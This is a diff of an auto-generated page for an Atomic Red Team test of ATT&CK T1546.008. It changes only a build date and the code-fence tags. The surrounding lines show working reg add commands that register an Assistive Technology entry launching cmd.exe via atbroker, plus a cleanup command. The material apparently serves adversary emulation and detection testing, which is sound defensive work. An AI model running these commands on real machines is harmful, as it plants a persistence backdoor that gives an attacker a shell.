@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1546.008"
 attack_technique_name: "Event Triggered Execution: Accessibility Features"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "444ff124-4c83-4e28-8df6-6efd3ece6bd4"
@@ -44,7 +44,7 @@ Executes code specified in the registry for a new AT (Assistive Technologies).
 
 ### Command
 
-```commandprompt
+```cmd
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
@@ -53,7 +53,7 @@ atbroker /start malware_test
 
 ### Cleanup
 
-```commandprompt
+```cmd
 reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
 ```
 
